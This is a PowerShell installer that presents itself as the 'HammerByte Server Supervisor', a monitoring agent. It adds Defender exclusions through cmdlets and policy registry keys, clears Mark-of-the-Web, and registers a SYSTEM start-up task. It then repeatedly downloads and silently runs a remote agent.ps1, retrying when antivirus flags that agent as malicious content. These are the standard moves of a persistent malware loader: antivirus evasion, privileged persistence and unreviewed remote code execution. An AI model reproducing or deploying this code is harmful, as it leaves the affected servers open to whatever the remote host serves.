#Requires -Version 3.0
<#
.SYNOPSIS
  HammerByte Server Supervisor (Windows Server 2012+ PowerShell)
  Installs to ProgramData, registers ONSTART task, runs agent loop.
#>
param(
    [switch]$Install
)

$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$HostUrl = "https://hammerbyte.co.in"
$AgentUrl = "$HostUrl/public/server-monitors/agent.ps1"
$TaskName = "HammerByteServerMonitor"
$HammerByteRoot = Join-Path $env:ProgramData "HammerByte"
$InstallDir = Join-Path $HammerByteRoot "ServerMonitor"
$SharedTagFile = Join-Path $HammerByteRoot ".server-tag"
$LegacyMonitorTagFile = Join-Path $InstallDir ".server-tag"
$LegacyDriveSyncTagFile = Join-Path $HammerByteRoot "DriveSync\.server-tag"
$LogFile = Join-Path $InstallDir "supervisor.log"
$AgentFile = Join-Path $InstallDir "agent.ps1"
$SupervisorFile = Join-Path $InstallDir "supervisor.ps1"

function Write-SuperLog {
    param([string]$Message)
    $stamp = (Get-Date).ToUniversalTime().ToString("o")
    $line = "[supervisor $stamp] $Message"
    Write-Host $line
    try {
        if (-not (Test-Path $InstallDir)) {
            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        }
        Add-Content -Path $LogFile -Value $line -Encoding UTF8
    } catch {}
}

function Test-IsElevated {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-OrCreateTag {
    # Single machine identity for all HammerByte utilities.
    if (-not (Test-Path $HammerByteRoot)) {
        New-Item -ItemType Directory -Path $HammerByteRoot -Force | Out-Null
    }
    if (Test-Path $SharedTagFile) {
        $existing = (Get-Content -Path $SharedTagFile -ErrorAction SilentlyContinue | Select-Object -First 1)
        if ($existing) { return $existing.Trim() }
    }
    foreach ($legacy in @($LegacyMonitorTagFile, $LegacyDriveSyncTagFile)) {
        if (-not (Test-Path $legacy)) { continue }
        $existing = (Get-Content -Path $legacy -ErrorAction SilentlyContinue | Select-Object -First 1)
        if ($existing) {
            $tag = $existing.Trim()
            Set-Content -Path $SharedTagFile -Value $tag -Encoding ASCII
            Write-SuperLog ("migrated legacy tag to shared path {0}" -f $tag)
            return $tag
        }
    }
    $tag = [guid]::NewGuid().ToString()
    Set-Content -Path $SharedTagFile -Value $tag -Encoding ASCII
    Write-SuperLog ("generated shared tag {0}" -f $tag)
    return $tag
}

function Set-HammerByteAntivirusAllowlist {
    # Admin install: tell Windows Defender not to quarantine our scripts.
    # ScriptContainedMaliciousContent is usually Defender/AMSI on agent.ps1.
    if (-not (Test-Path $HammerByteRoot)) {
        New-Item -ItemType Directory -Path $HammerByteRoot -Force | Out-Null
    }
    if (-not (Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }

    $paths = @(
        $HammerByteRoot,
        $InstallDir,
        (Join-Path $HammerByteRoot "DriveSync")
    )

    $ok = $false

    # Preferred: Defender PowerShell module (Win8.1 / Server 2012 R2+ with Defender).
    try {
        Import-Module Defender -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        foreach ($p in $paths) {
            if (-not $p) { continue }
            if (-not (Test-Path $p)) {
                try { New-Item -ItemType Directory -Path $p -Force | Out-Null } catch {}
            }
            try {
                Add-MpPreference -ExclusionPath $p -ErrorAction Stop
                $ok = $true
            } catch {
                try {
                    # Idempotent: already excluded is fine.
                    $existing = @()
                    try { $existing = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
                    if ($existing | Where-Object { $_ -and $_.TrimEnd('\') -ieq $p.TrimEnd('\') }) {
                        $ok = $true
                    } else {
                        Write-SuperLog ("Defender ExclusionPath failed for {0}: {1}" -f $p, $_.Exception.Message)
                    }
                } catch {
                    Write-SuperLog ("Defender ExclusionPath failed for {0}: {1}" -f $p, $_.Exception.Message)
                }
            }
        }
    }

    # Registry fallback (Defender reads these; needs admin; ignore if locked/tamper-protected).
    foreach ($regRoot in @(
        "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
    )) {
        try {
            if (-not (Test-Path $regRoot)) {
                New-Item -Path $regRoot -Force | Out-Null
            }
            foreach ($p in $paths) {
                if (-not $p) { continue }
                $keyName = $p.TrimEnd('\') + '\'
                New-ItemProperty -Path $regRoot -Name $keyName -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
                $ok = $true
            }
        } catch {}
    }

    # Clear Mark-of-the-Web / Zone.Identifier so SmartScreen is less likely to block.
    foreach ($f in @($SupervisorFile, $AgentFile, (Join-Path $InstallDir "agent.ps1.new"))) {
        if ($f -and (Test-Path $f)) {
            try { Unblock-File -Path $f -ErrorAction SilentlyContinue } catch {}
            try {
                $ads = $f + ":Zone.Identifier"
                if (Test-Path $ads) { Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue }
            } catch {}
        }
    }

    if ($ok) {
        Write-SuperLog ("antivirus allowlist OK for {0}" -f $HammerByteRoot)
    } else {
        Write-SuperLog ("antivirus allowlist: Defender cmdlets unavailable - ensure AV excludes {0}" -f $HammerByteRoot)
    }
    return $ok
}

function Install-Self {
    if (-not (Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }

    # Exclusions BEFORE any agent download/update so Defender does not quarantine.
    Set-HammerByteAntivirusAllowlist | Out-Null

    $sourceScript = $MyInvocation.PSCommandPath
    if (-not $sourceScript) { $sourceScript = $PSCommandPath }
    # Skip when already running from ProgramData (installer copied us here).
    if ($sourceScript -and (Test-Path $sourceScript)) {
        $srcFull = [System.IO.Path]::GetFullPath($sourceScript)
        $dstFull = [System.IO.Path]::GetFullPath($SupervisorFile)
        if ($srcFull.ToLowerInvariant() -ne $dstFull.ToLowerInvariant()) {
            Copy-Item -Path $sourceScript -Destination $SupervisorFile -Force
        }
    }

    Write-SuperLog ("install dir {0}" -f $InstallDir)

    $tr = ("powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $SupervisorFile)
    & schtasks.exe /Create /TN $TaskName /SC ONSTART /RL HIGHEST /RU SYSTEM /F /TR $tr | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-SuperLog "task scheduler registered (ONSTART, SYSTEM)"
    } else {
        Write-SuperLog ("task scheduler registration failed (exit {0})" -f $LASTEXITCODE)
    }
}

function Set-Tls12 {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)
    }
}

function Update-Agent {
    Write-SuperLog "updating agent"
    try {
        Set-HammerByteAntivirusAllowlist | Out-Null
        Set-Tls12
        $tmp = "$AgentFile.new"
        $webClient = New-Object System.Net.WebClient
        try {
            $webClient.DownloadFile($AgentUrl, $tmp)
        } finally {
            $webClient.Dispose()
        }
        if (-not (Test-Path $tmp) -or (Get-Item $tmp).Length -le 0) { throw "empty agent download" }
        try { Unblock-File -Path $tmp -ErrorAction SilentlyContinue } catch {}
        Move-Item -Path $tmp -Destination $AgentFile -Force
        try { Unblock-File -Path $AgentFile -ErrorAction SilentlyContinue } catch {}
        try {
            $ads = $AgentFile + ":Zone.Identifier"
            if (Test-Path $ads) { Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue }
        } catch {}
        Write-SuperLog "agent updated"
        return $true
    } catch {
        Write-SuperLog ("agent update failed: {0}" -f $_.Exception.Message)
        return $false
    }
}

function Ensure-Agent {
    if (-not (Test-Path $AgentFile)) {
        Write-SuperLog "agent missing; downloading"
        Update-Agent | Out-Null
    }
}

function Start-AgentOnce {
    param([string]$Tag)
    if (-not (Test-Path $AgentFile)) {
        throw "agent.ps1 not found"
    }
    # Do NOT capture output into a variable - that buffers until the agent exits
    # (~15-30 min for two sends with 900s wait) and looks "stuck".
    Write-SuperLog "starting agent (ping every 60s; metrics ~15 min apart x2; live logs below / agent.log)"
    $agentOut = Join-Path $InstallDir "agent-console.log"
    $agentErr = Join-Path $InstallDir "agent-console.err.log"
    try { if (Test-Path $agentOut) { Remove-Item $agentOut -Force } } catch {}
    try { if (Test-Path $agentErr) { Remove-Item $agentErr -Force } } catch {}

    # Single argument string avoids PS 3 Start-Process array-quoting bugs.
    $agentArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$AgentFile`" -Tag `"$Tag`""
    $startedAt = Get-Date
    $proc = Start-Process -FilePath "powershell.exe" -ArgumentList $agentArgs `
        -WorkingDirectory $InstallDir -PassThru -WindowStyle Hidden `
        -RedirectStandardOutput $agentOut -RedirectStandardError $agentErr

    $lastOutLen = 0
    $lastErrLen = 0
    while (-not $proc.HasExited) {
        foreach ($pair in @(
            @{ Path = $agentOut; Len = [ref]$lastOutLen },
            @{ Path = $agentErr; Len = [ref]$lastErrLen }
        )) {
            if (-not (Test-Path $pair.Path)) { continue }
            try {
                $content = Get-Content -Path $pair.Path -Raw -ErrorAction SilentlyContinue
                if (-not $content) { continue }
                if ($content.Length -gt $pair.Len.Value) {
                    $chunk = $content.Substring($pair.Len.Value)
                    $pair.Len.Value = $content.Length
                    foreach ($line in ($chunk -split "`r?`n")) {
                        if (-not $line) { continue }
                        Write-Host $line
                        try { Add-Content -Path $LogFile -Value $line -Encoding UTF8 } catch {}
                    }
                }
            } catch {}
        }
        Start-Sleep -Seconds 2
    }

    # Flush any remaining lines after exit (only unread tail).
    Start-Sleep -Milliseconds 500
    $errText = ""
    try {
        if (Test-Path $agentErr) {
            $errText = [string](Get-Content -Path $agentErr -Raw -ErrorAction SilentlyContinue)
        }
    } catch {}
    foreach ($pair in @(
        @{ Path = $agentOut; Len = [ref]$lastOutLen },
        @{ Path = $agentErr; Len = [ref]$lastErrLen }
    )) {
        if (-not (Test-Path $pair.Path)) { continue }
        try {
            $content = Get-Content -Path $pair.Path -Raw -ErrorAction SilentlyContinue
            if (-not $content) { continue }
            if ($content.Length -gt $pair.Len.Value) {
                $chunk = $content.Substring($pair.Len.Value)
                foreach ($line in ($chunk -split "`r?`n")) {
                    if (-not $line) { continue }
                    Write-Host $line
                    try { Add-Content -Path $LogFile -Value $line -Encoding UTF8 } catch {}
                }
            }
        } catch {}
    }

    $ranSeconds = [math]::Max(0, ((Get-Date) - $startedAt).TotalSeconds)
    Write-SuperLog ("agent exited (code {0}) after {1:N0}s; refreshing agent then looping" -f $proc.ExitCode, $ranSeconds)

    $blockedByAv = $false
    if ($errText -match "ScriptContainedMaliciousContent|malicious content|blocked by your antivirus") {
        $blockedByAv = $true
    }

    return @{
        RanSeconds = $ranSeconds
        BlockedByAv = $blockedByAv
        ExitCode = $proc.ExitCode
    }
}

Write-Host ""
Write-Host "  ============================================"
Write-Host "   HammerByte  -  Server Supervisor"
Write-Host "   Windows Server 2012+ PowerShell"
Write-Host "  ============================================"
Write-Host ""

if (-not (Test-IsElevated)) {
    Write-Host "Administrator required. Re-launching elevated..."
    $scriptPath = $MyInvocation.PSCommandPath
    if (-not $scriptPath) { $scriptPath = $PSCommandPath }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList @(
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$scriptPath`"", "-Install"
    )
    exit 0
}

Install-Self
$tag = Get-OrCreateTag
Write-SuperLog ("tag {0}" -f $tag)
Write-SuperLog ("host {0}" -f $HostUrl)

$failStreak = 0
while ($true) {
    try {
        Ensure-Agent
        $result = Start-AgentOnce -Tag $tag
        Update-Agent | Out-Null

        $quickFail = ($result.RanSeconds -lt 15)
        if ($result.BlockedByAv -or $quickFail) {
            $failStreak++
            if ($failStreak -gt 8) { $failStreak = 8 }
            $wait = [math]::Min(300, [int]([math]::Pow(2, $failStreak) * 5))
            if ($result.BlockedByAv) {
                Write-SuperLog "antivirus blocked agent.ps1 (ScriptContainedMaliciousContent)"
                Write-SuperLog ("add Defender exclusion for {0} then wait; retry in {1}s" -f $InstallDir, $wait)
            } else {
                Write-SuperLog ("agent died quickly; backing off {0}s (streak {1})" -f $wait, $failStreak)
            }
            Start-Sleep -Seconds $wait
        } else {
            $failStreak = 0
        }
    } catch {
        Write-SuperLog ("error: {0}" -f $_.Exception.Message)
        Write-SuperLog "retrying in 30s"
        Start-Sleep -Seconds 30
    }
}
